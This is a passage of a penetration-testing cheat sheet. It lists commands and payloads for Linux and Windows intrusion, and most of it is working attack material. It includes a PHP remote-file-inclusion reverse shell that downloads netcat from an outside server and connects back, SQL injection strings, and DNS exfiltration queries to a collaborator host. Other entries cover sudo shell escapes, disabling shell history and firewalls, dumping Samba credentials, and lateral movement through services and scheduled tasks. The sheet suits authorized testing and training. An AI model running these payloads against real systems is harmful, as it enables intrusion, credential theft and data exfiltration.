| plink.exe \<user\>@\<ip or domain\> -pw \<password\> -P 22 -2 -4 -T -N -C -R 0.0.0.0:12345:127.0.0.1:3389 |

<span id="anchor-94"></span>Shell Escapes (Linux w/sudo)

<span id="anchor-95"></span>vi(m)

|       |
| ----- |
| :\!sh |

|                            |
| -------------------------- |
| :set shell=/bin/bash:shell |

<span id="anchor-96"></span>nmap --interactive

|      |
| ---- |
| \!sh |

<span id="anchor-97"></span>awk

|                                       |
| ------------------------------------- |
| awk 'BEGIN {system(\\"/bin/bash\\")}' |

<span id="anchor-98"></span>perl

|                                 |
| ------------------------------- |
| perl -e 'exec \\"/bin/bash\\";' |

<span id="anchor-99"></span>find

|                                                                   |
| ----------------------------------------------------------------- |
| find / -exec /usr/bin/awk 'BEGIN {system(\\"/bin/bash\\")}' \\\\; |

<span id="anchor-100"></span>X Server Hacks

<span id="anchor-101"></span>How to Run An Application As An
Unprivileged User (i.e. WireShark)

This script will allow you to run an application as an unprivileged user

<table>
<tbody>
<tr class="odd">
<td><p>#!/bin/bash</p>
<p># Add the user to the X windows privilege list</p>
<p>xhost +SI:localuser:<strong>&lt;username&gt;</strong></p>
<p># Run the desired X app as the specified user</p>
<p>sudo -u<strong> &lt;username&gt; &lt;command and args&gt;</strong></p></td>
</tr>
</tbody>
</table>

<span id="anchor-102"></span>Kali Hacks

<span id="anchor-103"></span>Configure Wireshark to Run As a
Non-Privileged User

These steps will create a group called wireshark that will be granted
permission to run WireShark. You will need to add a standard user to the
system and make them a member of the group.

<table>
<tbody>
<tr class="odd">
<td><p><strong>root@kali:~#</strong> groupadd wireshark</p>
<p><strong>root@kali:~#</strong> chgrp wireshark /usr/bin/dumpcap</p>
<p><strong>root@kali:~#</strong> chmod 750 /usr/bin/dumpcap</p>
<p><strong>root@kali:~#</strong> setcap cap_net_raw,cap_net_admin=eip /usr/bin/dumpcap</p></td>
</tr>
</tbody>
</table>

<span id="anchor-104"></span>Configure Pure-FTP to Serve Files

This script will create a user and group for pure-ftp as well restart
the service.

<table>
<tbody>
<tr class="odd">
<td><p>#!/bin/bash</p>
<p><br />
groupadd ftpgroup<br />
useradd -g ftpgroup -d /dev/null -s /etc ftpuser<br />
pure-pw useradd offsec -u ftpuser -d /ftphome<br />
pure-pw mkdb<br />
cd /etc/pure-ftpd/auth/<br />
ln -s ../conf/PureDB 60pdb<br />
mkdir -p /ftphome<br />
chown -R ftpuser:ftpgroup /ftphome/<br />
/etc/init.d/pure-ftpd restart</p></td>
</tr>
</tbody>
</table>

<span id="anchor-105"></span>Useful Scripts

<span id="anchor-106"></span>Pull the Google Hacking Database (GHDB)
Into a CSV File

This will pull the GHDB down into a CSV file. You will need to replace
any “\&quote;” and “\&amp;” with regular characters. Perhaps I’ll add
that after I know all the special characters that they use. This script
uses a Chrome User Agent and pauses for a random interval to try to look
less scripted.

<table>
<tbody>
<tr class="odd">
<td><p>#!/bin/bash</p>
<p>for ((i = 2; i&lt;=4299; i++)); do</p>
<p>       page="$(wget --header="accept-encoding: gzip" --user-agent="Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" https://www.exploit-db.com/ghdb/$i/ -O - | gunzip)"</p>
<p>       desc="$(echo $page | grep "Google dork Description:" | awk -F '&lt;/strong&gt;' '{print $2}' | awk -F "&lt;/td&gt;" '{print $1}' | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"</p>
<p>       srch="$(echo $page | grep "Google search:" | awk -F 'rel="nofollow"&gt;' '{print $2}' | awk -F "&lt;/a&gt;" '{print $1}' | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"</p>
<p>       subm="$(echo $page | grep "Submited:&lt;/strong&gt;" | awk -F '&lt;/strong&gt;' '{print $4}' | awk -F "&lt;/td&gt;" '{print $1}' | sed -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//')"</p>
<p>       echo "\"$desc\", \"$srch\", \"$subm\"" &gt;&gt; ghdb.csv</p>
<p>       sleep "$(rand -M 30)"</p>
<p>done</p></td>
</tr>
</tbody>
</table>

<span id="anchor-107"></span>Zone Transfer (Bash)

This script will locate the NS servers and attempt to use the “host”
command to perform a zone transfer.

<table>
<tbody>
<tr class="odd">
<td><p>#!/bin/bash</p>
<p>if [ -z "$1" ]; then</p>
<p>echo "You must enter an argument"</p>
<p>else</p>
<p>for nameserver in $(dig -t NS +noall +answer "$1" | grep "NS" | cut -f 5 | sed -e 's/\.*$//'); do</p>
<p>host -l $1 $nameserver | grep "has address" | cut -d " " -f 1,4</p>
<p>done</p>
<p>fi</p></td>
</tr>
</tbody>
</table>

<span id="anchor-108"></span>PHP RFI Reverse Shell

This can be used in a RFI/LFI to download nc.exe from the specified
server then run it.

<table>
<tbody>
<tr class="odd">
<td><p>&lt;?php</p>
<p>        file_put_contents("nc.exe", fopen("http://<strong>&lt;server&gt;</strong>/nc.exe", 'r'));</p>
<p>        shell_exec("nc.exe -nv <strong>&lt;server&gt;</strong> <strong>&lt;port&gt;</strong> -e cmd.exe");</p>
<p>?&gt;</p></td>
</tr>
</tbody>
</table>

Using exec() to change directories and run a file uploaded elsewhere.

|                                                                                |
| ------------------------------------------------------------------------------ |
| \<?php exec('cd uploads && nc.exe -nv **\<server\> \<port\>** -e cmd.exe');?\> |

<span id="anchor-109"></span>Type Juggling

<span id="anchor-110"></span>PHP Loose Comparison

  - [*https://www.php.net/manual/en/types.comparisons.php*](https://www.php.net/manual/en/types.comparisons.php)

<span id="anchor-111"></span>PHP String Conversions

PHP duplicated the string conversion method used by Unix's strtod
command. Using this type of string conversion with Loose comparisons
could lead to type juggling.

  - [*https://www.php.net/manual/en/language.types.string.php\#language.types.string.conversion*](https://www.php.net/manual/en/language.types.string.php#language.types.string.conversion)
  - [*http://manpages.ubuntu.com/manpages/bionic/pt/man3/strtod.3.html*](http://manpages.ubuntu.com/manpages/bionic/pt/man3/strtod.3.html)

<span id="anchor-112"></span>SQL Injection

<span id="anchor-113"></span>SQL Tests

|            |            |             |             |             |              |
| ---------- | ---------- | ----------- | ----------- | ----------- | ------------ |
| or 1=1     | 'or 1=1    | "or 1=1     | or 1=1-     | 'or 1=1-    | "or 1=1-     |
| or 1=1\#   | 'or 1=1\#  | "or         | 1=1\#       | or 1=1/\*   | 'or 1=1/\*   |
| "or 1=1/\* | or 1=1;%00 | 'or 1=1;%00 | "or 1=1;%00 | 'or'        | 'or          |
| 'or'-      | 'or-       | or a=a      | 'or a=a     | "or a=a     | or a=a-      |
| 'or a=a-   | "or a=a-   | or 'a'='a'  | 'or 'a'='a' | "or 'a'='a' | ')or('a'='a' |
| ")"a"="a"  | ')'a'='a   | 'or"='      | ' or 1=1--  | " or 1=1--  | or 1=1--     |
| " or 1=1\# |            |             |             |             |              |

<span id="anchor-114"></span>SQL Comment Formats

<span id="anchor-115"></span>Microsoft SQL/PostgreSQL v1

|            |
| ---------- |
| \--comment |

<span id="anchor-116"></span>Microsoft SQL/PostgreSQL v1

|               |
| ------------- |
| /\*comment\*/ |

<span id="anchor-117"></span>Oracle v1

|            |
| ---------- |
| \--comment |

<span id="anchor-118"></span>MySQL v1 (Note the space)

|             |
| ----------- |
| \-- comment |

<span id="anchor-119"></span>MySQL v2

|           |
| --------- |
| \#comment |

<span id="anchor-120"></span>MySQL v3

|               |
| ------------- |
| /\*comment\*/ |

<span id="anchor-121"></span>SQL String Concatenation

<span id="anchor-122"></span>Oracle & PostgreSQL

|              |
| ------------ |
| 'foo'||'bar' |

<span id="anchor-123"></span>MySQL

<table>
<tbody>
<tr class="odd">
<td><p>'foo' 'bar'</p>
<p>CONCAT('foo','bar')</p></td>
</tr>
</tbody>
</table>

<span id="anchor-124"></span>Microsoft

|             |
| ----------- |
| 'foo'+'bar' |

<span id="anchor-125"></span>SQL Time Delays

<span id="anchor-126"></span>Oracle

|                                       |
| ------------------------------------- |
| dbms\_pipe.receive\_message(('a'),10) |

<span id="anchor-127"></span>Microsoft

|                        |
| ---------------------- |
| WAITFOR DELAY '0:0:10' |

<span id="anchor-128"></span>PostgreSQL

|                      |
| -------------------- |
| SELECT pg\_sleep(10) |

<span id="anchor-129"></span>MySQL

|                  |
| ---------------- |
| SELECT sleep(10) |

<span id="anchor-130"></span>SQL Conditional Time Delays

<span id="anchor-131"></span>Oracle

|                                                                                                                |
| -------------------------------------------------------------------------------------------------------------- |
| SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms\_pipe.receive\_message(('a'),10) ELSE NULL END FROM dual |

<span id="anchor-132"></span>Microsoft

|                                                 |
| ----------------------------------------------- |
| IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10' |

<span id="anchor-133"></span>PostgreSQL

|                                                                                 |
| ------------------------------------------------------------------------------- |
| SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg\_sleep(10) ELSE pg\_sleep(0) END |

<span id="anchor-134"></span>MySQL

|                                              |
| -------------------------------------------- |
| SELECT IF(YOUR-CONDITION-HERE,sleep(10),'a') |

<span id="anchor-135"></span>SQL DNS Lookup

<span id="anchor-136"></span>Oracle

<table>
<tbody>
<tr class="odd">
<td><p>SELECT extractvalue(xmltype('&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"&gt; %remote;]&gt;'),'/l') FROM dual</p>
<p>Or</p>
<p>SELECT UTL_INADDR.get_host_address('YOUR-SUBDOMAIN-HERE.burpcollaborator.net')</p></td>
</tr>
</tbody>
</table>

<span id="anchor-137"></span>Microsoft

|                                                                         |
| ----------------------------------------------------------------------- |
| exec master..xp\_dirtree '//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a' |

<span id="anchor-138"></span>PostgreSQL

|                                                                                 |
| ------------------------------------------------------------------------------- |
| copy (SELECT '') to program 'nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net' |

<span id="anchor-139"></span>MySQL (Windows only)

<table>
<tbody>
<tr class="odd">
<td><p>LOAD_FILE('\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a')</p>
<p>SELECT ... INTO OUTFILE '\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a'</p></td>
</tr>
</tbody>
</table>

<span id="anchor-140"></span>SQL DNS Lookup w/Data Exfiltration

<span id="anchor-141"></span>Oracle

|                                                                                                                                                                                                                                        |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| SELECT extractvalue(xmltype('\<?xml version="1.0" encoding="UTF-8"?\>\<\!DOCTYPE root \[ \<\!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/"\> %remote;\]\>'),'/l') FROM dual |

<span id="anchor-142"></span>Microsoft

|                                                                                                                                            |
| ------------------------------------------------------------------------------------------------------------------------------------------ |
| declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp\_dirtree "//'+@p+'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a"') |

<span id="anchor-143"></span>PostgreSQL

<table>
<tbody>
<tr class="odd">
<td><p>create OR replace function f() returns void as $$</p>
<p>declare c text;</p>
<p>declare p text;</p>
<p>begin</p>
<p>SELECT into p (SELECT YOUR-QUERY-HERE);</p>
<p>c := 'copy (SELECT '''') to program ''nslookup '||p||'.YOUR-SUBDOMAIN-HERE.burpcollaborator.net''';</p>
<p>execute c;</p>
<p>END;</p>
<p>$$ language plpgsql security definer;</p>
<p>SELECT f();</p></td>
</tr>
</tbody>
</table>

<span id="anchor-144"></span>MySQL (Windows only)

|                                                                                           |
| ----------------------------------------------------------------------------------------- |
| SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a' |

<span id="anchor-145"></span>SQL Database Enumeration Examples

<span id="anchor-146"></span>Discover Database Version (Microsoft SQL,
MySQL)

|                                                                               |
| ----------------------------------------------------------------------------- |
| http://\<someserver\>/comment.php?id=758 union all select 1,2,3,4,@@version,6 |

<span id="anchor-147"></span>Discover Database Version v1 (Oracle)

|                                                                               |
| ----------------------------------------------------------------------------- |
| http://\<someserver\>/comment.php?id=758 union all select 1,2,3,4,v$version,6 |

<span id="anchor-148"></span>Discover Database Version v2 (Oracle)

|                                                                                           |
| ----------------------------------------------------------------------------------------- |
| http://\<someserver\>/comment.php?id=758 union all select 1,2,3,4,banner,6 FROM v$version |

<span id="anchor-149"></span>Discover Database Version v3 (Oracle)

|                                                                                             |
| ------------------------------------------------------------------------------------------- |
| http://\<someserver\>/comment.php?id=758 union all select 1,2,3,4,version,6 FROM v$instance |

<span id="anchor-150"></span>Discover Database Version (PostgreSQL)

|                                                                               |
| ----------------------------------------------------------------------------- |
| http://\<someserver\>/comment.php?id=758 union all select 1,2,3,4,version(),6 |

<span id="anchor-151"></span>Discover Database User

|                                                                            |
| -------------------------------------------------------------------------- |
| http://\<someserver\>/comment.php?id=758 union all select 1,2,3,4,user(),6 |

<span id="anchor-152"></span>Enumerating Table Names (MySQL, Microsoft
SQL)

This example is injecting a “union all select” statement to place the
list of table names into column 5

|                                                                                                                 |
| --------------------------------------------------------------------------------------------------------------- |
| http://\<someserver\>/comment.php?id=758 union all select 1,2,3,4,table\_name,6 FROM information\_schema.tables |

|                                                                              |
| ---------------------------------------------------------------------------- |
| %' and 1=0 union select null, table\_name from information\_schema.tables \# |

<span id="anchor-153"></span>Enumerating Column Names of a Table (MySQL,
Microsoft SQL)

This example is injecting a “union all select” statement to list the
column names of the supplied talle.

|                                                                                                                                                                                                    |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| http://**\<server\>**/**\<somefile\>**.php?**\<somevariable\>**=**\<somevalue\>** union all select 1,2,3,4,column\_name,6 FROM information\_schema.columns where table\_name=’**\<table\_name\>**’ |

|                                                                                                             |
| ----------------------------------------------------------------------------------------------------------- |
| %' and 1=0 union select null, column\_name from information\_schema.columns where table\_name = 'users' \#” |

<span id="anchor-154"></span>Enumerating Table Names (Oracle)

|                                     |
| ----------------------------------- |
| SELECT table\_name FROM all\_tables |

<span id="anchor-155"></span>Enumerating Column Names (Oracle)

|                                                                                      |
| ------------------------------------------------------------------------------------ |
| SELECT column\_name FROM all\_tab\_columns WHERE table\_name = '**\<table\_name\>**' |

<span id="anchor-156"></span>Collecting Specific Information

|                                              |
| -------------------------------------------- |
| %' UNION SELECT user, password from users \# |

<span id="anchor-157"></span>Error Based Blind Enumeration

<span id="anchor-158"></span>Enumerate Database Name

|                                                                        |
| ---------------------------------------------------------------------- |
| 1 AND ORD(MID((SELECT IFNULL(CAST(database() AS CHAR), 0x20)),1,1))\>1 |

<span id="anchor-159"></span>Enumerate Table Name

|                                                                                                                                                                      |
| -------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1 AND ORD(MID((SELECT IFNULL(CAST(table\_name AS CHAR),0x20) FROM information\_schema.tables WHERE table\_schema=database() ORDER BY table\_name LIMIT 0,1),1,1))\>1 |

<span id="anchor-160"></span>Enumerate Column Name

|                                                                                                                                                                                 |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1 AND ORD(MID((SELECT IFNULL(CAST(column\_name AS CHAR),0x20) FROM information\_schema.columns WHERE table\_name=0x6775657374626f6f6b ORDER BY column\_name LIMIT 0,1),1,1))\>1 |

<span id="anchor-161"></span>Enumerate Field Value

Explaination:

  - ORD(string) - Returns the leftmost character in a string
  - MID(string, position, length) - Extracts a substring, returns 5th
    position single character
  - IFNULL(expression1, expression2) - Returns 1st expression is not
    NULL, otherwise returns 2nd
  - CAST() - Casts the string containing the column name to CHAR
  - 0x20 is a space and the first printable ASCII character
  - LIMIT 0, 1 - Returns first single row.

This query will return true if the single character that is in the 5th
position of the name field in the first row of the guestbook table of
the dvwa database is greater than 1. The final number is increased until
the result is false. A false result, past 1, indicates that the value
was located. If the false result happens at 1, that means that the value
is NULL/non-existent.

|                                                                                                             |
| ----------------------------------------------------------------------------------------------------------- |
| 1 AND ORD(MID((SELECT IFNULL(CAST(name AS CHAR),0x20) FROM dvwa.guestbook ORDER BY name LIMIT 0,1),5,1))\>1 |

<span id="anchor-162"></span>Linux Commands

<span id="anchor-163"></span>Disable Command History

|                |
| -------------- |
| unset HISTFILE |

<span id="anchor-164"></span>Check Linux Distribution

<span id="anchor-165"></span>Method 1

|                     |
| ------------------- |
| cat /etc/\*-release |

<span id="anchor-166"></span>Method 2

|                 |
| --------------- |
| Lsb\_release -a |

<span id="anchor-167"></span>Remove All Lines with non-ASCII Characters

|                                                              |
| ------------------------------------------------------------ |
| perl -nle 'print if m{^\[\[:ascii:\]\]+$}' **\<inputfile\>** |

<span id="anchor-168"></span>Remove All Lines with ASCII Characters

|                                                                |
| -------------------------------------------------------------- |
| perl -nle 'print if \!m{^\[\[:ascii:\]\]+$}' **\<inputfile\>** |

<span id="anchor-169"></span>Convert From Windows(dos) to Unix File
Format

<span id="anchor-170"></span>dos2unix

|                           |
| ------------------------- |
| dos2unix **\<filename\>** |

<span id="anchor-171"></span>vi(m)

<table>
<tbody>
<tr class="odd">
<td><p>:1,$s/^M//g</p>
<p>:set ff=unix</p>
<p>:w</p>
<p>To enter “^M” press <strong>CTRL+V</strong> then <strong>Enter</strong></p></td>
</tr>
</tbody>
</table>

<span id="anchor-172"></span>awk

|                                                                      |
| -------------------------------------------------------------------- |
| awk '{ sub("\\r$", ""); print }' **\<winfile\>** \> **\<unixfile\>** |

<span id="anchor-173"></span>perl

|                                                              |
| ------------------------------------------------------------ |
| perl -p -e 's/\\r$//' \< **\<winfile\>** \> **\<unixfile\>** |

<span id="anchor-174"></span>tr

|                                                         |
| ------------------------------------------------------- |
| tr -d '\\15\\32' \< **\<winfile\>** \> **\<unixfile\>** |

<span id="anchor-175"></span>Dump Samba Credentials

|             |
| ----------- |
| pdbdump -Lw |

|                          |
| ------------------------ |
| pbtool **\<file\>** dump |

<span id="anchor-176"></span>Execute Commands Without Spaces (Examples)

<table>
<tbody>
<tr class="odd">
<td>IFS=,;`cat&lt;&lt;&lt;cat,/etc/passwd`<br />
cat$IFS/etc/passwd<br />
cat${IFS}/etc/passwd<br />
cat&lt;/etc/passwd               <br />
{cat,/etc/passwd} OR {ls,-las,/var} with args<br />
X=$'cat\x20/etc/passwd'&amp;&amp;$X</td>
</tr>
</tbody>
</table>

<span id="anchor-177"></span>Windows Commands

<span id="anchor-178"></span>PowerShell

<span id="anchor-179"></span>Encoding Commands from File (Linux)

|                                                       |
| ----------------------------------------------------- |
| iconv -f ASCII -t UTF-16LE **\<file\>** | base64 -w 0 |

<span id="anchor-180"></span>Encoding Commands from Inline (Linux)

|                                                          |
| -------------------------------------------------------- |
| echo "**\<command\>**" | iconv -t UTF-16LE | base64 -w 0 |

<span id="anchor-181"></span>Encoding Commands with Python

<table>
<tbody>
<tr class="odd">
<td><p>from base64 import b64encode</p>
<p>b64encode('<strong>&lt;command&gt;</strong>').encode('UTF-16LE')</p></td>
</tr>
</tbody>
</table>

<span id="anchor-182"></span>Encoding Commands with Ruby

<table>
<tbody>
<tr class="odd">
<td><p>require "base64"</p>
<p>Base64.encode64('<strong>&lt;command&gt;</strong>'.force_encoding('UTF-16LE'))</p></td>
</tr>
</tbody>
</table>

<span id="anchor-183"></span>Checking for Access Level

<span id="anchor-184"></span>Check Username

|                 |
| --------------- |
| Echo %USERNAME% |

<span id="anchor-185"></span>Use DIR to Check For Admin Rights

|                          |
| ------------------------ |
| dir \\\\**\<host\>**\\C$ |

<span id="anchor-186"></span>Use AT to Check For Admin Rights

|                     |
| ------------------- |
| at \\\\**\<host\>** |

<span id="anchor-187"></span>System Details

<span id="anchor-188"></span>Discover Domain (workstation)

|                        |
| ---------------------- |
| net config workstation |

<span id="anchor-189"></span>Discover Domain (server)

|                        |
| ---------------------- |
| net config workstation |

<span id="anchor-190"></span>View Domain Controller Name Via Registry

|                                                                                                  |
| ------------------------------------------------------------------------------------------------ |
| reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\ CurrentVersion\\Group Policy\\History" /v DCName |

<span id="anchor-191"></span>Check Patch Level

|                                                       |
| ----------------------------------------------------- |
| wmic qfe get Caption,Description,HotFixID,InstalledOn |

<span id="anchor-192"></span>Check for Specific Installed Path

|                                                                                       |
| ------------------------------------------------------------------------------------- |
| wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"**\<kbnumber\>**" |

<span id="anchor-193"></span>Get Drive Details

|                                                       |
| ----------------------------------------------------- |
| wmic logicaldisk get caption,description,providername |

<span id="anchor-194"></span>Firewall

<span id="anchor-195"></span>Disable Firewall (Windows XP)

|                                   |
| --------------------------------- |
| netsh firewall set opmode disable |

<span id="anchor-196"></span>Enable Firewall (Windows XP)

|                                  |
| -------------------------------- |
| netsh firewall set opmode enable |

<span id="anchor-197"></span>Disable Firewall (Windows Vista, Requires
Elevation, UAC)

|                                                |
| ---------------------------------------------- |
| netsh advfirewall set currentprofile state off |

<span id="anchor-198"></span>Enable Firewall (Windows Vista, Requires
Elevation, UAC)

|                                               |
| --------------------------------------------- |
| netsh advfirewall set currentprofile state on |

<span id="anchor-199"></span>Check Firewall Status (Windows Vista &
Newer)

|                                 |
| ------------------------------- |
| netsh advfirewall firewall dump |

<span id="anchor-200"></span>Check Firewall Status (Windows XP)

|                           |
| ------------------------- |
| netsh firewall show state |

<span id="anchor-201"></span>Show Firewall Configuration (Windows XP)

|                            |
| -------------------------- |
| Netsh firewall show config |

<span id="anchor-202"></span>User & Group Commands

<span id="anchor-203"></span>Current User Privileges

|              |
| ------------ |
| whoami /priv |

<span id="anchor-204"></span>Current User Groups

|                |
| -------------- |
| whoami /groups |

<span id="anchor-205"></span>User Details (local)

|                           |
| ------------------------- |
| net user **\<username\>** |

<span id="anchor-206"></span>User Details (domain)

|                                   |
| --------------------------------- |
| net user **\<username\>** /domain |

<span id="anchor-207"></span>Create a User

|                                                 |
| ----------------------------------------------- |
| net user **\<username\>** **\<password\>** /ADD |

<span id="anchor-208"></span>Add a User to a Group

|                                                        |
| ------------------------------------------------------ |
| net localgroup **\<groupname\>** **\<username\>** /add |

<span id="anchor-209"></span>Find Domain Admins

|                                   |
| --------------------------------- |
| net group "Domain Admins" /domain |

<span id="anchor-210"></span>Find Enterprise Admins

|                                       |
| ------------------------------------- |
| net group “Enterprise Admins” /domain |

<span id="anchor-211"></span>List Local Groups

|                |
| -------------- |
| net localgroup |

<span id="anchor-212"></span>List Local Group Members

|                                  |
| -------------------------------- |
| net localgroup **\<groupname\>** |

<span id="anchor-213"></span>List Local Password Policy

|              |
| ------------ |
| net accounts |

<span id="anchor-214"></span>List Domain Password Policy

|                      |
| -------------------- |
| net accounts /domain |

<span id="anchor-215"></span>Command Execution

<span id="anchor-216"></span>WMIC Execute a Command (Admin)

|                                                                 |
| --------------------------------------------------------------- |
| wmic /node:”**\<host\>**” process call create “**\<program\>**” |

<span id="anchor-217"></span>PowerShell Execute a Command (Admin, WinRM,
Port 5985)

|                                                                            |
| -------------------------------------------------------------------------- |
| Invoke-Command -ComputerName **\<host\>** -ScriptBlock { **\<command\>** } |

<span id="anchor-218"></span>PowerSploit Execute a Command (Admin,
Non-Bind)

|                                                                                                           |
| --------------------------------------------------------------------------------------------------------- |
| Invoke-WmiCommand -ComputerName **\<target\>** -Payload { **\<command\>** } | select -exp “PayloadOutput” |

<span id="anchor-219"></span>PowerShell Execution of SCT File Using .NET
Assemblies

<table>
<tbody>
<tr class="odd">
<td><p>[Reflection.Assembly]::LoadWithPartialName('Microsoft.JScript');</p>
<p>[Microsoft.Jscript.Eval]::JScriptEvaluate('GetObject("script:<strong>&lt;SCT_URL&gt;</strong>").Exec()',[Microsoft.JScript.Vsa.VsaEngine]::CreateEngine());</p></td>
</tr>
</tbody>
</table>

<span id="anchor-220"></span>Lateral Movement

<span id="anchor-221"></span>Create Service w/WINRM.EXE

<table>
<tbody>
<tr class="odd">
<td><p>winrm invoke Create wmicimv2/Win32_Service @{Name="<strong>&lt;name&gt;</strong>";DisplayName="<strong>&lt;name&gt;</strong>";PathName="<strong>&lt;command&gt;</strong>"} -r:http://<strong>&lt;hostname&gt;</strong>:5985</p>
<p>winrm invoke StartService wmicimv2/Win32_Service?Name=<strong>&lt;name&gt;</strong> -r:http://<strong>&lt;hostname&gt;</strong>:5985</p></td>
</tr>
</tbody>
</table>

<span id="anchor-222"></span>Processes

<span id="anchor-223"></span>PowerShell - Get-Process

|             |
| ----------- |
| Get-Process |

<span id="anchor-224"></span>TaskList List Processes

|                             |
| --------------------------- |
| tasklist /v /S **\<host\>** |

<span id="anchor-225"></span>TaskList Kill Processes

|                                              |
| -------------------------------------------- |
| tasklist /S **\<host\>** /PID **\<pid\>** /F |

<span id="anchor-226"></span>Find a Specific Processes Information

|                                               |
| --------------------------------------------- |
| tasklist | findstr /i “**\<process\_name\>**” |

<span id="anchor-227"></span>WMIC List Processes - Full

|                                             |
| ------------------------------------------- |
| wmic /node:”**\<host\>**” process list full |

<span id="anchor-228"></span>WMIC List Processes - Brief

|                                              |
| -------------------------------------------- |
| wmic /node:”**\<host\>**” process list brief |

<span id="anchor-229"></span>WMIC Kill Process by PID

|                                                                            |
| -------------------------------------------------------------------------- |
| wmic /node:”**\<host\>**” where (ProcessID = “**\<PID\>**”) call terminate |

<span id="anchor-230"></span>WMIC Kill Process by Name

|                                                                           |
| ------------------------------------------------------------------------- |
| wmic /node:”**\<host\>**” where (Name = “**\<PE Name\>**”) call terminate |

<span id="anchor-231"></span>Services

<span id="anchor-232"></span>List Services

[*https://technet.microsoft.com/en-us/library/cc990290(v=ws.11).aspx*](https://technet.microsoft.com/en-us/library/cc990290\(v=ws.11\).aspx)

|                                   |
| --------------------------------- |
| sc query type= service state= all |

<span id="anchor-233"></span>List Services (Old Way)

|           |
| --------- |
| net start |

<span id="anchor-234"></span>Find Services with Unquoted Paths (wmic)

|                                                                                                                             |
| --------------------------------------------------------------------------------------------------------------------------- |
| wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\\Windows\\\\" |findstr /i /v """ |

<span id="anchor-235"></span>Find Services with Unquoted Paths
(PowerShell)

|                                                                                                                                                                                   |
| --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Get-WmiObject win32\_service | select name,pathname | Where-Object -Filter { $\_.pathname -notlike "\`"\*\`"\*" -and $\_.pathname -notlike "C:\\WINDOWS\\\*" -and -$\_.pathname } |

<span id="anchor-236"></span>Enable Service (Admin or User Modifiable
Service)

|                                         |
| --------------------------------------- |
| sc config **\<service\>** start= demand |

<span id="anchor-237"></span>Start Service (Admin or User Modifiable
Service)

|                           |
| ------------------------- |
| net start **\<service\>** |

<span id="anchor-238"></span>Stop Service (Admin or User Modifiable
Service)

|                          |
| ------------------------ |
| net stop **\<service\>** |

<span id="anchor-239"></span>Create a Service (Admin, Service PE)

|                                                                  |
| ---------------------------------------------------------------- |
| sc \\\\**\<host\>** create **\<name\>** binpath= **\<program\>** |

**Note: **You can create a service that runs CMD with the /C or /K that
specified another command. Windows will kill the CMD but leave the
program it runs active.

<span id="anchor-240"></span>Edit a Writable Service (use accesschk.exe
to find one)

<table>
<tbody>
<tr class="odd">
<td><p># Change the command</p>
<p>sc config <strong>&lt;servicename&gt;</strong> binpath= “<strong>&lt;command and arguments&gt;</strong>”</p>
<p># Change the User the service runs as</p>
<p>sc config <strong>&lt;servicename&gt;</strong> obj= “.\LocalSystem” password= “”</p></td>
</tr>
</tbody>
</table>

<span id="anchor-241"></span>Scheduled Tasks (Admin)

<span id="anchor-242"></span>Schedule a Task with AT

<table>
<tbody>
<tr class="odd">
<td><p><strong>Check the time with:</strong></p>
<p>net time \\<strong>&lt;host&gt;</strong></p>
<p><strong>Schedule the task with:</strong></p>
<p>at \\<strong>&lt;host&gt; HH:MM &lt;command&gt;</strong></p></td>
</tr>
</tbody>
</table>

<span id="anchor-243"></span>Schedule a Task with SCHTASKS

<table>
<tbody>
<tr class="odd">
<td><p><strong>Create the task:</strong></p>
<p>schtasks /create /tn <strong>&lt;name&gt;</strong> /tr <strong>&lt;program&gt;</strong> /sc once /st 00:00 /S <strong>&lt;host&gt;</strong> /RU System</p>
<p><strong>Run the task:</strong></p>
<p>schtasks /run /tn <strong>&lt;name&gt;</strong> /S <strong>&lt;host&gt;</strong></p></td>
</tr>
</tbody>
</table>

<span id="anchor-244"></span>Network Discovery

<span id="anchor-245"></span>PowerShell - List Connections

|                      |
| -------------------- |
| Get-NetTCPConnection |

<span id="anchor-246"></span>List Established Connections

|                                             |
| ------------------------------------------- |
| netstat -anp **\[tcp|udp\]** | find “ESTAB” |

<span id="anchor-247"></span>List Listening Ports

|                                              |
| -------------------------------------------- |
| netstat -anp **\[tcp|udp\]** | find “LISTEN” |

<span id="anchor-248"></span>List Open Ports with PIDs

|              |
| ------------ |
| netstat -ano |

<span id="anchor-249"></span>Show IP Addressing Configuration Details

|                                   |
| --------------------------------- |
| netsh interface ip show addresses |

<span id="anchor-250"></span>Show IP Routing Configuration Details

|                               |
| ----------------------------- |
| netsh interface ip show route |

<span id="anchor-251"></span>Show IP Neighbor Details

|                                   |
| --------------------------------- |
| netsh interface ip show neighbors |

<span id="anchor-252"></span>ARP Table List

|        |
| ------ |
| arp -a |

<span id="anchor-253"></span>Display DNS Cache

|                      |
| -------------------- |
| ipconfig /displaydns |

<span id="anchor-254"></span>Display Ports with Connections and
Processes

|               |
| ------------- |
| netstat -nabo |

<span id="anchor-255"></span>Display Routing Table (netstat)

|            |
| ---------- |
